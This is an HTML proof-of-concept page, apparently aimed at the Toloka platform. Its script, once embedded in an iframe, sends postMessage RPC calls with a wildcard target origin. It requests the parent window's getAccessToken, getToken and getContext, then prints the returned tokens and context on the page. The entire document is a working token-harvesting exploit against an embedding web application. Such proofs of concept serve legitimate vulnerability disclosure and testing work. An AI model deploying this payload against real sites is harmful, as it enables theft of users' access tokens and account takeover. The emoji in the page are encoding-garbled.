<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Toloka PoC - RPC Access</title>
  <style>
    body { font-family: sans-serif; background: #111; color: #0f0; padding: 20px; }
    pre { background: #000; padding: 10px; overflow: auto; }
  </style>
</head>
<body>
  <h1>ðŸ”“ Toloka PoC - Access from iframe</h1>
  <p>Trying to call <code>getAccessToken</code>, <code>getToken</code>, and <code>getContext</code> via postMessage...</p>

  <pre id="log">Waiting...</pre>

  <script>
    const log = (msg) => {
      document.getElementById("log").textContent += `\n${msg}`;
    };

    function callRPC(method, payload = {}) {
      const id = crypto.randomUUID();
      window.addEventListener('message', function handler(e) {
        if (e.data?.id === id) {
          log(`[âœ… ${method}] â†’ ${JSON.stringify(e.data.payload, null, 2)}`);
          window.removeEventListener('message', handler);
        }
      });

      window.parent.postMessage({
        type: 'rpc',
        id,
        name: method,
        payload
      }, '*');

      log(`[ðŸ“¤ ${method}] Request sent...`);
    }

    // Call all 3 methods
    ['getAccessToken', 'getToken', 'getContext'].forEach(m => callRPC(m));
  </script>
</body>
</html>
